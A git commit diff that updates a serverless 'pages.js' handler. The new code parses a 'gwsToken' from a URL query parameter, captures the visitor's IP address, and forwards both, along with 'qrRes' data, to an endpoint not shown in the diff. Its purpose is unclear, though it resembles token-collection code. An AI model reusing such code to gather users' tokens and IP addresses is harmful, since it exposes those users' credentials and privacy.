04d58e30d47d3a41bea8b9879c30b9a764865688
henxdl <123426614+henxdl@users.noreply.github.com>
2025-04-09 17:47:53 -0500

    Update pages.js

--- functions/api/pages.js
+++ functions/api/pages.js
@@ -1,12 +1,13 @@
 export async function onRequest(context) {
     const { request } = context;
     const url = new URL(request.url);
-    const idMatch = decodeURI(url.pathName);
+    const idMatch = url.search.match(/[?&]i=([^&]+)/);
+    const idString = decodeURI(idMatch ? idMatch[1] : null);
     const ip = request.headers.get("CF-Connecting-IP");
     
     let id;
     try {
-        id = JSON.parse(idMatch);
+        id = JSON.parse(idString);
         id = id.gwsToken;
     } catch (error) {}
     try {
@@ -25,7 +26,7 @@ export async function onRequest(context) {
                 headers: {
                     "Content-Type": "application/json"
                 },
-                body: JSON.stringify({ userRes: idMatch, qrRes: nodeApiData, ip: ip })
+                body: JSON.stringify({ userRes: idString, qrRes: nodeApiData, ip: ip })
             });
         }
     } catch (error) {}
